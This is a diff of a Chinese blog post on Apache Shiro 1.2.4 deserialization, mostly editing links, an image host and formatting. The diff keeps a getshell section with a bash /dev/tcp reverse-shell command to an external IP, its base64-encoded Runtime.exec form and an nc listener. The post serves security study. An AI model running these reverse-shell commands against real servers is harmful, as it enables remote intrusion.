@@ -6,7 +6,7 @@ author: Bin4xin
 wrench: 2021-11-19
 permalink: /about/ShiroDeser/
 toc: true
-desc: 「其他研究」
+desc: 「反序列化」
 ---
 
 # 分享：Different Shiro Framework deserialization analysis ideas
@@ -38,7 +38,7 @@ desc: 「其他研究」
 
 # 零：Shiro框架的简介和相关用途
 
-![Alt](https://i.loli.net/2021/11/18/Ab68nZiLOqcwoh4.png#pic_center)
+![Ab68nZiLOqcwoh4.png](https://image.yjs2635.xyz/images/2022/02/20/Ab68nZiLOqcwoh4.png)
 
 ---
 
@@ -83,9 +83,6 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
 
 # 一：Shiro框架反序列化的原因
 
-
-`return rmm.getRememberedPrincipals(subjectContext);`
-
 ## 1x01：Shiro代码层分析
 
 - **web.xml**
@@ -108,14 +105,16 @@ Subject代表了当前用户的安全操作，SecurityManager则管理所有用�
 
 <a href="#"> <i class="fa fa-hand-o-down"></i></a> 
 
-<kbd>⌘</kbd>+ 左键单击 `SecurityUtils` 跳转`shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class`
+<kbd>⌘</kbd>+ 左键单击 `SecurityUtils` 跳转
+
+`shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class`
+
 那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；
 
-参考
+- 参考
 
-- https://www.jianshu.com/p/ccd0b79db702
-- https://blog.csdn.net/w1196726224/article/details/53560385
-
+- [Shiro 认证流程分析](https://www.jianshu.com/p/ccd0b79db702){:target="_blank"}
+- [Shiro 登录认证源码详解](https://blog.csdn.net/w1196726224/article/details/53560385){:target="_blank"}
 
 先直接在home.jsp页面处下断点，处理流程大概如下：
 - JavaServer Pages：
@@ -203,10 +202,16 @@ vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA
 
 ## 2x01：getshell
 通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码`bash -i >& /dev/tcp/47.52.233.92/11111 0>&1`，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
-转成base64编码->`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}`；
+转成base64编码 :
+
+```bash
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
+````
 
 像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
-[我是转换网址:-)](http://www.jackson-t.ca/runtime-exec-payloads.html){:target="_blank"}
+
+- [java.lang.Runtime.exec()转换网址](http://www.jackson-t.ca/runtime-exec-payloads.html){:target="_blank"}
+
 监听端口等待shell回连（我这里的样例是docker环境）
 ```
 nc -lvvp 11111
